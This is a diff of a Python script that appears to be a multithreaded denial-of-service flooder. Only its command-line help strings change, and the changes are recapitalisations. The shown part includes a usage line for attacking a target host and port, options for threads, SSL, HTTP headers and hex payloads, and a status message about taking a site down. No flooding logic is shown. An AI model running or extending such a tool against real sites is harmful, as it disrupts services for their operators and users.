@@ -9,7 +9,7 @@ from time import sleep
 from threading import Thread, active_count
 from os import system, geteuid
 
-example_text = ''' \nTips: Target page with 1500+ bytes size.
+example_text = ''' \nTips : Target Page With 1500+ Bytes Size .
 
 example:
   sudo python %s example.com/test.php -p 80 -http
@@ -26,16 +26,16 @@ Dropped  - TCP Handshakes Or Payloads Rejected By Victim ( Site Down )
 
 parser = argparse.ArgumentParser(epilog=example_text, formatter_class=argparse.RawTextHelpFormatter)
 parser._action_groups.pop()
-required = parser.add_argument_group('required arguments')
-optional = parser.add_argument_group('optional arguments')
+required = parser.add_argument_group('Required Arguments')
+optional = parser.add_argument_group('Optional Arguments')
 
-required.add_argument('target', help='Specify a target to attack')
-required.add_argument('-p', dest='port', help='Specify port to attack', type=int, required=True)
+required.add_argument('target', help='Specify A Target To Attack')
+required.add_argument('-p', dest='port', help='Specify Port To Attack', type=int, required=True)
 
-optional.add_argument('-t', dest='THREADS', type=int, default=300, help='Threads, default = 300 threads')
+optional.add_argument('-t', dest='THREADS', type=int, default=300, help='Threads Default = 300 Threads')
 optional.add_argument('-ssl', action='store_true',  help='Enable SSL')
-optional.add_argument('-http', action='store_true',  help='Enable HTTP headers (only if custom payload not set)')
-optional.add_argument('-payload', help='Set payload as hex-string')
+optional.add_argument('-http', action='store_true',  help='Enable HTTP Headers ( Only İf Custom Payload Not Set )')
+optional.add_argument('-payload', help='Set Payload As Hex-String')
 
 
 
@@ -64,7 +64,7 @@ try:
     else:
         payload = ''
 except:
-    print('Use hex string format as payload.')
+    print('Use Hex String Format As Payload .')
     sys.exit()
 
 
